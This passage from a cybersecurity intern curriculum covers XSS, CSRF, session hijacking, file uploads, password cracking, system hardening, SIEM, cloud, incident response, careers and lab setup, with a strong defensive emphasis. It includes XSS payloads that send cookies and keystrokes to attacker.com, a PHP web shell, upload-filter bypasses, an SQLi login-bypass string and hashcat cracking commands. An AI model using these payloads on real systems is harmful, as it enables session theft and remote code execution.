- **Stored XSS** (Persistent): Malicious script stored in database, served to all users
- **Reflected XSS**: Script in URL, triggered when user clicks malicious link
- **DOM-based XSS**: Script manipulates the DOM without server interaction

**Payloads:**
```javascript
// Basic test
<script>alert('XSS')</script>

// Cookie stealing
<script>document.location='http://attacker.com/?c='+document.cookie</script>

// Keylogger
<script>document.onkeypress=function(e){fetch('http://attacker.com/?k='+e.key)}</script>

// Bypass filters (alternative tags)
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
```

**Prevention:**
- **Output encoding** (HTML encode user input before displaying)
- **Content Security Policy (CSP)** header
- Input validation
- `HttpOnly` flag on cookies (prevents JavaScript access)

**Quick Revision**
- XSS = inject JavaScript into pages other users see
- Stored XSS = most dangerous (affects all users)
- `<script>alert(1)</script>` = basic XSS test
- Prevention = output encoding + CSP + HttpOnly cookies


## CSRF

**Definition**
CSRF (Cross-Site Request Forgery) tricks an authenticated user into unknowingly submitting a malicious request on a web application where they're logged in.

**Key Explanation**
- Exploits the trust a website has in the user's browser
- User is already authenticated, so forged requests carry their credentials/session

**Example:**
```html
<!-- Attacker's malicious page -->
<img src="http://bank.com/transfer?to=attacker&amount=10000">
<!-- When victim visits attacker's page while logged into bank,
     this request is sent automatically with their session cookie -->
```

**Prevention:**
- **CSRF tokens** (unique, random token per form, verified server-side)
- **SameSite cookie attribute** (Strict or Lax)
- **Double Submit Cookie** pattern
- Check `Origin` and `Referer` headers

**Quick Revision**
- CSRF = forged request using victim's authenticated session
- Prevention = CSRF tokens + SameSite cookies
- XSS vs CSRF: XSS injects script | CSRF forges requests


## Session Hijacking

**Definition**
Session hijacking is the exploitation of a valid session token to gain unauthorized access to a user's session with a web application.

**Key Explanation**
- Web apps use session cookies to track authenticated users
- If an attacker steals the session cookie, they can impersonate the user
- Methods: XSS, network sniffing (HTTP), predictable session IDs

**Attack methods:**
```
1. Cookie theft via XSS
2. Network sniffing (HTTP, unencrypted Wi-Fi)
3. Session fixation (attacker sets a known session ID before login)
4. Brute forcing weak/short session tokens
```

**Prevention:**
- `HttpOnly` cookie flag (no JavaScript access)
- `Secure` cookie flag (HTTPS only)
- Regenerate session ID after login
- Short session timeout
- Use HTTPS everywhere

**Quick Revision**
- Session hijacking = stealing session cookie to impersonate user
- XSS + `document.cookie` = most common method
- HttpOnly + Secure flags = primary cookie protection
- Regenerate session ID after successful login


## File Upload Vulnerabilities

**Definition**
File upload vulnerabilities occur when a web application accepts file uploads without proper validation, allowing attackers to upload malicious files.

**Key Explanation**
- Attacker uploads PHP/ASP/JSP shell instead of an image
- If the file is served from the web root, it can be executed via browser
- Can lead to Remote Code Execution (RCE)

**Bypass techniques:**
```
1. Change file extension: shell.php → shell.php.jpg → shell.php%00.jpg
2. Change MIME type in Content-Type header: image/jpeg
3. Magic bytes bypass: Add image header bytes to PHP file
4. Double extension: shell.jpg.php
5. Null byte: shell.php%00.jpg (older PHP versions)
```

**Web shell example:**
```php
<?php system($_GET['cmd']); ?>
# Access: http://target.com/uploads/shell.php?cmd=whoami
```

**Prevention:**
- Validate file extension (whitelist, not blacklist)
- Validate MIME type
- Rename uploaded files
- Store uploads outside web root
- Serve files through an application (not directly)
- Use antivirus scanning on uploads

**Quick Revision**
- Upload vulnerability = upload shell → get RCE
- Always validate server-side (not just client-side JavaScript)
- Whitelist allowed extensions (jpg, png, pdf only)
- Never serve uploaded files with execute permissions


## MODULE 6 — MINI ASSIGNMENTS & REVISION

**Practical Tasks**
1. Set up DVWA (Damn Vulnerable Web Application) on your local machine
2. Complete DVWA's SQL Injection challenge (all three difficulty levels)
3. Complete DVWA's XSS (Reflected and Stored) challenges
4. Use Burp Suite to intercept and analyze a DVWA request
5. Complete TryHackMe "OWASP Top 10" room
6. Find and exploit the file upload vulnerability in DVWA

**MCQs**
1. What is the #1 OWASP Top 10 risk in 2021?
   - a) SQL Injection  **b) Broken Access Control**  c) XSS  d) CSRF

2. Which SQL injection payload bypasses authentication?
   - a) SELECT * FROM users  **b) ' OR 1=1 --**  c) DROP TABLE users  d) UNION SELECT 1

3. What flag prevents JavaScript from accessing cookies?
   - **a) HttpOnly**  b) Secure  c) SameSite  d) Path

4. Which attack forges requests using a victim's authenticated session?
   - a) XSS  **b) CSRF**  c) SQLi  d) LFI

---

# MODULE 7 — PASSWORD & AUTHENTICATION SECURITY

## Password Hashing

**Definition**
Password hashing is a one-way cryptographic transformation of a password into a fixed-length string, so the original password cannot be retrieved if the hash is stolen.

**Key Explanation**
- Hashing is one-way (cannot be reversed mathematically)
- Encryption is two-way (can be decrypted with key)
- Passwords should NEVER be stored in plaintext or with reversible encryption

**Important Points**

| Algorithm | Output Length | Security | Use Case |
|---|---|---|---|
| **MD5** | 128-bit | Broken | Don't use for passwords |
| **SHA-1** | 160-bit | Broken | Don't use for passwords |
| **SHA-256** | 256-bit | Acceptable | General hashing |
| **bcrypt** | Variable | Good | Password storage |
| **scrypt** | Variable | Good | Password storage |
| **Argon2** | Variable | Best | Password storage (NIST recommended) |

- **Salt** = random string added to password before hashing (prevents rainbow table attacks)
- `password + salt` → hash → stored in DB
- Good password hashing: bcrypt(password + salt, cost_factor)

```bash
# Identifying hash types
hash-identifier <hash>
hashid <hash>

# Common hash examples
MD5:     5f4dcc3b5aa765d61d8327deb882cf99  (password)
SHA-1:   5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8  (password)
bcrypt:  $2b$12$... (includes cost factor and salt)
```

**Quick Revision**
- Hash = one-way | Encryption = two-way
- MD5/SHA-1 = broken for passwords | Use bcrypt/Argon2
- Salt = prevents rainbow table attacks
- Cost factor (bcrypt) = makes cracking slower


## Multi-Factor Authentication (MFA)

**Definition**
MFA requires users to verify identity using two or more different factors: something you know, something you have, or something you are.

**Important Points**

| Factor Type | Examples |
|---|---|
| **Something you know** | Password, PIN, security question |
| **Something you have** | TOTP app, hardware token, SMS code |
| **Something you are** | Fingerprint, face recognition, iris scan |

- MFA is the single most effective control to prevent account compromise
- **TOTP** (Time-based One-Time Password) = Google Authenticator, Authy
- **FIDO2/WebAuthn** = phishing-resistant hardware-based authentication (YubiKey)
- SMS-based MFA is vulnerable to SIM swapping — TOTP is better
- **Authenticator apps** > SMS > email for 2FA security

**Quick Revision**
- MFA = 2+ factors from different categories
- TOTP > SMS for security
- YubiKey (FIDO2) = most secure form of MFA
- MFA stops credential stuffing and password spray attacks


## Brute Force & Credential Attacks

**Definition**
Brute force attacks try every possible combination to guess credentials. Related attacks use existing credential lists.

**Attack Types:**
| Type | Description | Tool |
|---|---|---|
| **Brute Force** | Try all possible combinations | Hydra, Hashcat |
| **Dictionary Attack** | Try words from a wordlist | John, Hashcat |
| **Credential Stuffing** | Use leaked username/password pairs | Sentry MBA, Hydra |
| **Password Spray** | Try one password against many accounts | Spray |
| **Rainbow Table** | Precomputed hash lookup | Ophcrack |

```bash
# Hashcat (GPU-based password cracking - much faster than John)
hashcat -m 0 hash.txt rockyou.txt         # MD5 dictionary attack
hashcat -m 1000 ntlm.txt rockyou.txt      # NTLM (Windows)
hashcat -m 3200 bcrypt.txt rockyou.txt    # bcrypt
hashcat -m 0 hash.txt -a 3 ?a?a?a?a      # 4-char brute force

# -m = hash mode | -a = attack mode (0=dict, 3=brute, 6=hybrid)
# ?a = all chars | ?l = lowercase | ?u = uppercase | ?d = digits
```

**Quick Revision**
- Credential stuffing = using leaked passwords from other breaches
- Password spray = low-and-slow (avoids lockout)
- Hashcat = GPU cracking (much faster) | John = CPU cracking
- rockyou.txt has 14 million common passwords


## MODULE 7 — MINI ASSIGNMENTS & REVISION

**Practical Tasks**
1. Identify hash types: `098f6bcd4621d373cade4e832627b4f6` and `e10adc3949ba59abbe56e057f20f883e`
2. Crack both hashes using John the Ripper with rockyou.txt
3. Use Hashcat to crack the MD5 hash: `5f4dcc3b5aa765d61d8327deb882cf99`
4. Research 3 real-world credential stuffing attacks
5. Enable TOTP 2FA on a test account and document the process

---

# MODULE 8 — SYSTEM SECURITY

## Windows Security Basics

**Definition**
Windows security encompasses the built-in and configurable security features of Microsoft Windows operating systems.

**Key Concepts:**
```
Active Directory (AD)    → Directory service managing users, computers, policies
Group Policy (GPO)       → Centralized policy management across domain
NTLM / Kerberos          → Windows authentication protocols
SAM database             → Local account password hashes (/Windows/System32/config/SAM)
Windows Registry         → Database of system and application settings
Event Viewer             → Windows log viewer (Security, System, Application logs)
Windows Defender         → Built-in AV and security suite
Windows Firewall         → Built-in firewall
BitLocker                → Full disk encryption
UAC (User Account Control) → Prompts before privilege elevation
```

**Key Windows security commands:**
```cmd
# User/group management
net user                           # List users
net user administrator             # User details
net localgroup administrators      # Local admin group members

# Services
sc query                           # List services
sc query windefend                 # Windows Defender status

# Firewall
netsh advfirewall show allprofiles # Firewall status
netsh advfirewall firewall show rule name=all  # All rules

# Registry
reg query HKLM\SOFTWARE\...        # Query registry

# Scheduled tasks
schtasks /query /fo LIST /v        # All scheduled tasks

# Network
netstat -ano                       # Active connections with PIDs
ipconfig /all                      # Network configuration

# PowerShell (more powerful)
Get-LocalUser                      # List local users
Get-Process                        # Running processes
Get-Service                        # Services
Get-ScheduledTask                  # Scheduled tasks
```

**Privilege escalation (Windows):**
- Unquoted service paths
- Writable service binaries
- AlwaysInstallElevated registry key
- Token impersonation
- Tool: **WinPEAS**, **PowerUp.ps1**

**Quick Revision**
- SAM = local Windows password hashes
- Active Directory = centralized authentication for Windows domains
- WinPEAS = automated Windows privesc enumeration
- Kerberos = Windows domain authentication protocol
- Event IDs: 4624=login, 4625=failed login, 4648=explicit creds used


## Linux Security Basics

**Definition**
Linux security involves hardening the OS to minimize attack surface and implement defense-in-depth.

**Key Hardening Steps:**
```bash
# 1. Keep system updated
sudo apt update && sudo apt upgrade -y

# 2. Minimal installation (remove unnecessary packages)
sudo apt remove <unneeded-packages>

# 3. Disable unnecessary services
sudo systemctl disable <service>
sudo systemctl stop <service>

# 4. Configure firewall
sudo ufw enable
sudo ufw allow 22/tcp
sudo ufw deny 23/tcp
sudo ufw status

# 5. Fail2ban (auto-ban brute force attempts)
sudo apt install fail2ban
# Bans IPs after X failed SSH login attempts

# 6. SSH hardening (/etc/ssh/sshd_config)
PermitRootLogin no              # Disable root SSH login
PasswordAuthentication no       # Key-only authentication
Port 2222                       # Change default port
MaxAuthTries 3                  # Limit auth attempts
AllowUsers specificuser         # Whitelist users

# 7. Audit SUID/SGID files
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# 8. Check for world-writable files (bad)
find / -perm -002 -type f 2>/dev/null

# 9. Review cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron*
```

**Quick Revision**
- Disable root SSH login (`PermitRootLogin no`)
- Key-based SSH auth > passwords
- fail2ban = automatic brute force protection
- `ufw` = simple iptables frontend
- Regular patching = most impactful security control


## SIEM Basics

**Definition**
SIEM (Security Information and Event Management) is a system that aggregates, correlates, and analyzes security event data from across an organization to detect threats.

**Key Explanation**
- Collects logs from firewalls, servers, AV, IDS/IPS, endpoints
- Correlates events to detect attack patterns
- Generates alerts for the SOC team
- Used for compliance (GDPR, PCI-DSS require log retention)

**Key SIEM concepts:**
```
Log sources    → Firewalls, Windows Event Logs, Linux syslogs, AV
Parsing        → Converting raw logs into structured fields
Correlation    → Matching events across sources (e.g., same IP fails login on 5 servers)
Alert          → Notification when rule matches suspicious activity
Dashboard      → Visual overview of security posture
Retention      → Storing logs for compliance (typically 90 days to 1 year)
```

**Common SIEM platforms:**

| Platform | Type | Notes |
|---|---|---|
| **Splunk** | Commercial | Industry leader, powerful query language (SPL) |
| **IBM QRadar** | Commercial | Enterprise-grade |
| **Microsoft Sentinel** | Cloud (Azure) | Cloud-native SIEM |
| **Elastic SIEM (ELK)** | Open source | Elasticsearch + Logstash + Kibana |
| **Wazuh** | Open source | SIEM + HIDS, great for learning |

**Splunk SPL basics:**
```
index=* sourcetype=syslog | stats count by host
index=windows EventCode=4625 | stats count by user, src_ip
index=* "Failed password" | timechart count by src_ip
```

**Quick Revision**
- SIEM = centralized log collection + correlation + alerting
- Wazuh/ELK = free options for learning
- Splunk = industry standard (learn SPL queries)
- SIEM is the core tool of a SOC analyst
- Key Windows event IDs: 4624, 4625, 4648, 4720, 4732


## MODULE 8 — MINI ASSIGNMENTS & REVISION

**Practical Tasks**
1. Install Wazuh (open-source SIEM) and connect a Linux agent
2. Review Windows Event Logs in Event Viewer — filter for event ID 4625 (failed logins)
3. Harden a fresh Linux VM using the hardening checklist above
4. Run WinPEAS on a Windows machine (lab) and review findings
5. Configure fail2ban on a Linux machine and attempt SSH brute force from another machine

---

# MODULE 9 — CLOUD & MODERN SECURITY

## Cloud Security Basics

**Definition**
Cloud security encompasses the technologies, policies, controls, and services that protect cloud data, applications, and infrastructure.

**Key Explanation**
- Cloud follows a **Shared Responsibility Model**: provider secures the infrastructure, customer secures their data and configuration
- Misconfiguration is the #1 cloud security issue (e.g., public S3 buckets)

**Shared Responsibility Model:**
```
+------------------+---------------------+------------------+
|                  | IaaS (EC2/VMs)      | SaaS (O365)      |
+------------------+---------------------+------------------+
| Customer         | OS, Apps, Data,     | Data, Users,     |
| Responsible For  | Network config,     | Access           |
|                  | Identity            |                  |
+------------------+---------------------+------------------+
| Provider         | Physical,           | Everything       |
| Responsible For  | Hypervisor,         | except data/     |
|                  | Network infra       | user access      |
+------------------+---------------------+------------------+
```

**Common cloud misconfigurations:**
- Public S3 buckets (AWS) — exposed to internet
- Overly permissive IAM roles
- Security groups with 0.0.0.0/0 (open to internet)
- Unencrypted databases
- Disabled logging (CloudTrail off)
- Default credentials on cloud services

**Quick Revision**
- Shared Responsibility = provider does infrastructure, you do your data/config
- Misconfiguration = #1 cloud threat
- Open S3 bucket = one of the most common cloud breaches
- Tools: ScoutSuite, Prowler, Pacu (cloud security assessment)


## AWS Security Basics

**Definition**
AWS (Amazon Web Services) is the world's leading cloud platform; understanding its security controls is essential for modern security professionals.

**Key AWS Security Services:**

| Service | Purpose |
|---|---|
| **IAM** | Identity and Access Management — who can do what |
| **CloudTrail** | Audit log of all AWS API calls |
| **CloudWatch** | Monitoring and alerting |
| **GuardDuty** | Threat detection (ML-based) |
| **Security Hub** | Centralized security findings |
| **WAF** | Web Application Firewall |
| **Shield** | DDoS protection |
| **KMS** | Key Management Service (encryption keys) |
| **VPC** | Virtual Private Cloud — isolated network |
| **Security Groups** | Virtual firewall for EC2 instances |
| **S3 Bucket Policies** | Access control for object storage |

**AWS CLI security commands:**
```bash
# Check for public S3 buckets
aws s3 ls                               # List buckets
aws s3api get-bucket-acl --bucket name  # Check bucket ACL
aws s3api get-public-access-block --bucket name  # Public access settings

# IAM enumeration
aws iam list-users                      # List IAM users
aws iam get-user                        # Current user
aws iam list-attached-user-policies --user-name admin  # User policies

# CloudTrail
aws cloudtrail describe-trails          # List trails
aws cloudtrail get-trail-status --name trail-name  # Trail status
```

**Quick Revision**
- IAM = core of AWS security (least privilege principle)
- CloudTrail = AWS audit logs (always enable)
- GuardDuty = AWS threat detection
- Security Groups = AWS firewall (default deny)
- Never use root account for daily operations


## Zero Trust

**Definition**
Zero Trust is a security model that assumes no user, device, or network is inherently trusted — every access request must be explicitly verified regardless of its origin.

**Key Principles:**
- **"Never trust, always verify"**
- Verify identity (strong authentication, MFA)
- Least privilege access (only access needed resources)
- Assume breach (segment networks, limit blast radius)
- Continuous monitoring and validation

**Key components:**
```
Identity verification    → MFA, SSO, identity provider (Okta, Azure AD)
Device compliance        → Check device health before granting access
Network segmentation     → Microsegmentation (no flat network access)
Least privilege IAM      → Users get minimum required permissions
Encrypted communication  → TLS everywhere (even internal traffic)
Continuous monitoring    → Log everything, detect anomalies
```

**Quick Revision**
- Zero Trust = verify everything, trust nothing by default
- Replaces legacy perimeter-based security ("castle and moat")
- Key controls: MFA + least privilege + microsegmentation
- Google BeyondCorp = real-world Zero Trust implementation


## MODULE 9 — MINI ASSIGNMENTS & REVISION

**Practical Tasks**
1. Create a free AWS account, set up IAM user with least privilege
2. Enable CloudTrail and review a few logged events
3. Try to find a misconfigured public S3 bucket (responsibly — use TryHackMe cloud rooms)
4. Research the 2019 Capital One AWS breach — what misconfiguration was exploited?
5. Complete TryHackMe "Cloud" rooms

---

# MODULE 10 — BLUE TEAM BASICS

## SOC Overview

**Definition**
A Security Operations Center (SOC) is a centralized team of security professionals responsible for monitoring, detecting, analyzing, and responding to cybersecurity incidents.

**SOC Tiers:**

| Tier | Role | Responsibilities |
|---|---|---|
| **Tier 1** | Alert Analyst | Triage alerts, initial investigation, escalation |
| **Tier 2** | Incident Responder | Deep-dive investigations, containment |
| **Tier 3** | Threat Hunter / Expert | Proactive hunting, advanced analysis, forensics |
| **Manager** | SOC Manager | Team coordination, reporting to leadership |

**SOC tools:**
- **SIEM** (Splunk, QRadar, Sentinel) — log aggregation and correlation
- **EDR** (CrowdStrike, SentinelOne, Defender) — endpoint detection and response
- **SOAR** (Splunk SOAR, Palo Alto XSOAR) — automated response playbooks
- **Ticketing** (ServiceNow, Jira) — incident tracking
- **Threat Intel** (VirusTotal, ThreatConnect, MISP) — context enrichment

**Quick Revision**
- SOC = 24/7 security monitoring team
- Tier 1 = frontline alert triage (typical entry-level role)
- SIEM = primary SOC tool
- SOAR = automate repetitive response tasks
- SOC analysts use MITRE ATT&CK to classify attacks


## Incident Response

**Definition**
Incident response (IR) is the structured approach to handling security breaches or cyber attacks, minimizing damage and recovery time.

**IR Lifecycle (NIST SP 800-61):**
```
1. PREPARATION
   └── Policies, IR plan, tools, team training
   
2. DETECTION & ANALYSIS
   └── Identify and confirm the incident
   └── Scope assessment (what's affected?)
   
3. CONTAINMENT
   └── Short-term: isolate affected systems
   └── Long-term: fix vulnerability, monitor
   
4. ERADICATION
   └── Remove malware, patch vulnerability
   └── Reset compromised credentials
   
5. RECOVERY
   └── Restore systems from clean backups
   └── Monitor for re-infection
   
6. POST-INCIDENT ACTIVITY (Lessons Learned)
   └── Document what happened, how it was handled
   └── Improve defenses
```

**IR terminology:**
- **IOC** (Indicator of Compromise) = evidence of a breach (IP, hash, domain)
- **TTPs** = Tactics, Techniques, Procedures (attacker methods)
- **Playbook** = documented step-by-step response for specific incident types
- **RTO/RPO** = Recovery Time Objective / Recovery Point Objective

**Quick Revision**
- NIST IR lifecycle: Preparation → Detection → Containment → Eradication → Recovery → Lessons Learned
- IOCs = malicious IPs, file hashes, domains
- Always preserve evidence before remediation (forensic copies)
- Containment before eradication to prevent evidence loss


## MITRE ATT&CK Framework

**Definition**
MITRE ATT&CK is a globally-accessible knowledge base of adversary tactics, techniques, and procedures (TTPs) based on real-world observations.

**Key Explanation**
- Provides a common language for describing attacker behavior
- Used by SOC teams to detect, investigate, and respond to threats
- Available at attack.mitre.org

**ATT&CK Tactics (the "why" — attacker's goals):**

| # | Tactic | Description |
|---|---|---|
| TA0043 | Reconnaissance | Gathering target information |
| TA0042 | Resource Development | Setting up attack infrastructure |
| TA0001 | Initial Access | Getting into the target network |
| TA0002 | Execution | Running malicious code |
| TA0003 | Persistence | Maintaining access after reboots |
| TA0004 | Privilege Escalation | Gaining higher permissions |
| TA0005 | Defense Evasion | Avoiding detection |
| TA0006 | Credential Access | Stealing credentials |
| TA0007 | Discovery | Learning about the environment |
| TA0008 | Lateral Movement | Moving through the network |
| TA0009 | Collection | Gathering data of interest |
| TA0010 | Exfiltration | Stealing data out of network |
| TA0011 | Command and Control | Communicating with compromised systems |
| TA0040 | Impact | Disrupting/destroying systems |

**Example:**
WannaCry mapped to ATT&CK:
- Initial Access: T1190 (Exploit Public-Facing Application via EternalBlue)
- Lateral Movement: T1210 (Exploitation of Remote Services)
- Impact: T1486 (Data Encrypted for Impact)

**Quick Revision**
- MITRE ATT&CK = standard framework for attacker TTPs
- 14 tactics = high-level attack goals
- Each tactic has techniques and sub-techniques
- Used in threat hunting, detection rule writing, SOC operations
- attack.mitre.org — always keep this bookmarked


## Log Analysis

**Definition**
Log analysis is the process of reviewing and interpreting security log data to identify threats, anomalies, and compliance issues.

**Key Logs for Security:**

```bash
# Windows Security Log (Event IDs)
4624  → Successful login
4625  → Failed login
4648  → Login with explicit credentials
4672  → Admin login
4720  → User account created
4726  → User account deleted
4732  → User added to privileged group
4768  → Kerberos ticket requested
4776  → NTLM authentication
7045  → New service installed

# Linux Auth Log
grep "Failed password" /var/log/auth.log    # Brute force attempts
grep "Accepted password" /var/log/auth.log  # Successful logins
grep "sudo" /var/log/auth.log               # Sudo usage

# Apache/Nginx Access Logs
# Format: IP - user [timestamp] "METHOD /path HTTP/1.1" status size
192.168.1.100 - - [17/May/2026:10:25:00] "POST /login HTTP/1.1" 200 1234
# 403 = Forbidden (scanner/unauthorized) | 500 = Server error | 200 = OK

# Detect web scanning in logs
cat access.log | grep 404 | awk '{print $1}' | sort | uniq -c | sort -rn
# High 404s from one IP = scanner
```

**Quick Revision**
- Windows 4625 = failed login (watch for brute force bursts)
- Windows 4720/4732 = new user/group change (persistence indicator)
- HTTP 404 spikes from one IP = web scanner
- `grep`, `awk`, `sort`, `uniq` = log analysis toolkit in Linux


## MODULE 10 — MINI ASSIGNMENTS & REVISION

**Practical Tasks**
1. Complete TryHackMe "SOC Level 1" learning path
2. Analyze a sample log file — find the IP that made the most requests
3. Look up WannaCry on attack.mitre.org — map all TTPs used
4. Write an incident response plan for a ransomware attack using NIST framework
5. Set up Wazuh and trigger alerts by attempting SSH brute force

**MCQs**
1. What does the "I" in IOC stand for?
   - a) Intrusion  **b) Indicator**  c) Internal  d) Impact

2. Which NIST IR phase involves removing malware from affected systems?
   - a) Containment  **b) Eradication**  c) Recovery  d) Detection

3. Windows Event ID 4625 represents:
   - a) Successful login  **b) Failed login**  c) New account created  d) Privilege escalation

4. What does MITRE ATT&CK document?
   - a) Compliance requirements  b) Vulnerability scores  **c) Adversary tactics, techniques, procedures**  d) Firewall rules

---

# MODULE 11 — CAREER & INTERNSHIP READINESS

## Cybersecurity Job Roles

| Role | Description | Key Skills |
|---|---|---|
| **SOC Analyst (L1/L2/L3)** | Monitor, detect, respond to incidents | SIEM, log analysis, incident response |
| **Penetration Tester** | Ethical hacking, find vulnerabilities | Nmap, Metasploit, Burp Suite |
| **Red Team Operator** | Advanced adversary simulation | Custom exploit dev, C2 frameworks |
| **Security Engineer** | Build/maintain security systems | Cloud, scripting, security architecture |
| **AppSec Engineer** | Secure software development | Code review, SAST/DAST, SDLC |
| **Incident Responder** | Investigate and contain breaches | Digital forensics, malware analysis |
| **Threat Hunter** | Proactively search for hidden threats | SIEM, threat intel, MITRE ATT&CK |
| **GRC Analyst** | Governance, risk, compliance | ISO 27001, GDPR, risk assessment |
| **Cloud Security Architect** | Secure cloud infrastructure | AWS/Azure, IAM, DevSecOps |
| **Digital Forensics Analyst** | Investigate cybercrime evidence | Autopsy, Volatility, memory forensics |

**Entry-level friendly roles:** SOC Analyst (L1), Junior Pentester, GRC Analyst

**Quick Revision**
- SOC Analyst = most common entry-level role
- Red Team = offensive | Blue Team = defensive | Purple = combined
- Build skills through CTFs, labs, and certifications before job applications


## Certifications Roadmap

**Beginner → Advanced:**

```
BEGINNER
├── CompTIA Security+          → Foundation cert, widely recognized
├── Google Cybersecurity        → Free certificate (Coursera)
└── eJPT (eLearnSecurity)       → Beginner pentest cert, practical

INTERMEDIATE
├── CEH (Certified Ethical Hacker)  → Popular, concept-heavy
├── CompTIA PenTest+               → Practical pentest cert
├── CompTIA CySA+                  → Blue team/analyst cert
└── SC-200 (Microsoft Sentinel)    → Cloud SIEM

ADVANCED
├── OSCP (Offensive Security Certified Professional)  → Gold standard for pentesters
├── CISSP                          → Management/architecture level
├── CISM                           → Management-focused
├── GPEN / GWAPT (SANS/GIAC)       → Premium, expensive
└── CRTO (Certified Red Team Operator)  → Red team with C2
```

**Recommendation for your internship trajectory:**
1. CompTIA Security+ (study while doing internship)
2. TryHackMe SOC Level 1 path (free)
3. eJPT (first practical pentest cert, affordable)
4. OSCP (6–12 months after eJPT)


## Writing Vulnerability Reports

**Professional Vulnerability Report Template:**

```
VULNERABILITY REPORT

Title:          [Vulnerability Name]
Date:           [Date Found]
Severity:       Critical / High / Medium / Low / Informational
CVSS Score:     [0.0 – 10.0]
CVE Reference:  [CVE-XXXX-XXXXX if applicable]
CWE Category:   [CWE-XXX]

─────────────────────────────────────────
EXECUTIVE SUMMARY
[2-3 sentences explaining the finding and its business impact in non-technical language]

─────────────────────────────────────────
TECHNICAL DESCRIPTION
[Detailed explanation of the vulnerability, how it works]

─────────────────────────────────────────
EVIDENCE
[Screenshots, command output, proof of concept]

Step 1: [what you did]
Step 2: [what happened]
[Screenshot: image showing the vulnerability]

─────────────────────────────────────────
IMPACT
[What can an attacker do if this is exploited?]
[Data exposed, systems compromised, business impact]

─────────────────────────────────────────
REMEDIATION RECOMMENDATION
[Specific, actionable steps to fix the issue]
[Reference: OWASP, vendor documentation, best practices]

─────────────────────────────────────────
REFERENCES
- CVE link
- CWE link
- OWASP link
- Vendor advisory
```

**Key writing principles:**
- Use plain English in executive summary
- Every claim needs evidence (screenshot or output)
- Be specific in remediation (not "fix the code" but "use parameterized queries")
- Rate severity consistently using CVSS
- Never exaggerate or fabricate findings


## GitHub Portfolio & LinkedIn

**GitHub Portfolio:**
```
Your GitHub should have:
├── CTF Writeups           (document how you solved CTF challenges)
├── Tool Scripts           (automation scripts you've written)
├── Lab Walkthroughs       (TryHackMe/HackTheBox writeups)
├── Research Notes         (your learning notes)
└── Tools/Projects         (any tools you've built)

Profile README should include:
- Brief bio (cybersecurity learner/intern)
- Skills list
- Certifications
- Notable projects
- TryHackMe/HackTheBox badge links
```

**LinkedIn Optimization:**
- Headline: "Cybersecurity Intern @ Deep Cyte | Aspiring Penetration Tester | Security+"
- About: 3-4 sentences on your journey, skills, and goals
- Skills section: Add technical skills (Nmap, Burp Suite, SIEM, Python, etc.)
- Post weekly: CTF writeups, things you learned, lab screenshots
- Connect with: other security professionals, conference speakers, recruiter
- Follow: SANS, OWASP, Krebs on Security, Darknet Diaries

**Quick Revision**
- GitHub = your technical portfolio (public and active)
- CTF writeups = best portfolio projects for beginners
- LinkedIn = professional networking, not just a CV
- Post consistently — visible learners get noticed


## Internship Etiquette & Professionalism

**Key Principles:**
1. **Never test systems without authorization** — always confirm scope in writing
2. **Document everything** — keep detailed notes of every action taken
3. **Ask questions** — better to ask than to guess and break something
4. **Report findings promptly** — don't sit on critical findings
5. **Handle data carefully** — treat client data with confidentiality
6. **Follow the chain of command** — escalate through proper channels
7. **Meet deadlines** — communicate early if you'll miss one
8. **Be curious but responsible** — lab environments only for practice

**Communication tips:**
- Use clear, concise emails with subject lines that summarize the request
- Report blockers immediately, don't go silent
- Summarize technical findings in plain English for non-technical stakeholders
- Take notes in every meeting and send follow-up summaries

---

# 60-DAY STUDY ROADMAP

## Week 1–2: Foundations (Days 1–14)
```
Day 1-2:   Module 1 — Cybersecurity Fundamentals
Day 3-4:   Module 2 — Networking (OSI, TCP/IP, IP, DNS)
Day 5-6:   Module 2 — Networking (HTTP, Ports, Firewalls)
Day 7:     Lab — Set up Kali Linux VM
Day 8-9:   Module 3 — Linux Basics, File Permissions, Commands
Day 10-11: Module 3 — Networking Commands, SSH, Logs
Day 12-13: TryHackMe — "Pre-Security" path
Day 14:    Week 1-2 Revision + MCQs
```

## Week 3–4: Core Hacking Skills (Days 15–28)
```
Day 15-16: Module 4 — Pentesting Lifecycle, Recon
Day 17-18: Module 5 — Nmap deep dive + practice
Day 19-20: Module 5 — Burp Suite setup + DVWA
Day 21-22: Module 6 — OWASP Top 10, SQLi, XSS
Day 23-24: Module 5 — Metasploit basics
Day 25-26: TryHackMe — "Complete Beginner" path
Day 27:    Lab — Metasploitable 2 full compromise
Day 28:    Week 3-4 Revision + MCQs
```

## Week 5–6: Advanced Topics (Days 29–42)
```
Day 29-30: Module 6 — CSRF, Session Hijacking, File Upload
Day 31-32: Module 7 — Password Security, MFA, Cracking
Day 33-34: Module 8 — Windows Security, Linux Hardening
Day 35-36: Module 9 — Cloud Security, AWS Security
Day 37-38: Module 10 — SOC, Incident Response, MITRE ATT&CK
Day 39-40: TryHackMe — "SOC Level 1" path
Day 41:    Lab — Log analysis, Wazuh SIEM setup
Day 42:    Week 5-6 Revision
```

## Week 7–8: Practical & Career (Days 43–60)
```
Day 43-45: TryHackMe — Complete 5 CTF rooms, write reports
Day 46-47: Hack The Box — Starting Point (first 3 machines)
Day 48:    Module 11 — Career, Certifications
Day 49-50: Write 3 professional vulnerability reports
Day 51-52: Build GitHub portfolio (upload CTF writeups)
Day 53-54: CompTIA Security+ study (domain 1-2)
Day 55-56: Review all modules 1-5 cheat sheets
Day 57-58: Review all modules 6-11 cheat sheets
Day 59:    Mock interview practice (interview questions at end)
Day 60:    Final revision — all Quick Revision sections
```

---

# LAB SETUP GUIDE

## Minimum Requirements
```
RAM:    8GB minimum (16GB recommended)
CPU:    4 cores (virtualization must be enabled in BIOS)
Disk:   100GB free space
OS:     Windows 10/11 or macOS or Linux host
```

## Step-by-Step Setup

**1. Install VirtualBox (free)**
- Download: virtualbox.org
- Install VirtualBox + Extension Pack

**2. Install Kali Linux VM**
- Download: kali.org/get-kali → Virtual Machines → VirtualBox OVA
- Import OVA into VirtualBox
- Default credentials: kali / kali
- `sudo apt update && sudo apt upgrade -y` (update)

**3. Install Metasploitable 2 (intentionally vulnerable VM)**
- Download from: sourceforge.net/projects/metasploitable
- Import into VirtualBox
- Default credentials: msfadmin / msfadmin
- Set network to Host-Only (so only your Kali can reach it)

**4. Install DVWA (Damn Vulnerable Web App)**
```bash
# On Kali or separate VM
sudo apt install apache2 php mysql-server php-mysql
